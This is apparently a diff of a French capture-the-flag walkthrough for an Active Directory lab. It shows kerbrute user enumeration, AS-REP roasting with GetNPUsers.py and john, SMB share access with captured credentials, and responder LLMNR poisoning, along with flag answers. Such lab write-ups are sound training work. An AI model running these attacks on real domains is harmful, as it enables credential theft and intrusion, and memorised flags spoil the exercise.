@@ -148,7 +148,11 @@ Attaque :
 
 Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.
 
+```powershell
+
 kerbrute userenum --dc "10.100.0.111" -d "bellagio.local" users.txt
+
+```
 
 FLAG : svc-bella
 
@@ -169,10 +173,11 @@ Attaque :
 
 => L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.
 
-
+```powershell
 GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.100.0.111" "bellagio.local/"
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 Flag (à soumettre) : P@ssw0rd
 
@@ -193,19 +198,31 @@ Grace a toutes ces informations tu peux par exemple t'interesser au partage samb
 
 Attaque : 
 
+```powershell
+
 smbmap -H "10.100.0.111" -d bellagio.local -u 'svc-bella' -p 'P@ssw0rd'
+
+```
 
 Lire le fichier de log et le pentester ce rend compte que toutes les 5min un utilisateur se connecte et execute un script toutes les 5 minutes (taches planifiées) 
 
+```powershell
 smbclient //10.100.0.111/script -U 'bellagio\svc-bella%P@ssw0rd'
 
 get 111_script_smb.ps1
+
+```
 
 Modifier le nom de domaine dans le fichier du script 111_script_smb.ps1
 
 Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèrent le hash du compte. 
 
-responder -i ens18 
+```powershell
+
+responder -i ens18
+
+```
+
 
 Flag :
 
@@ -450,7 +467,7 @@ Grace à cela il trouve un utilisateur valide. Il peut désormais se connecter a
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 9 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)
+Level 10 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)
 
 
 Le pentester peut lister les repertoires sur le partage SMB avec ses credentials.
@@ -541,7 +558,7 @@ Restart-Service -Name "VulnerableService"
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 12:
+Level 12 (AD Mirage) A trouver :
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
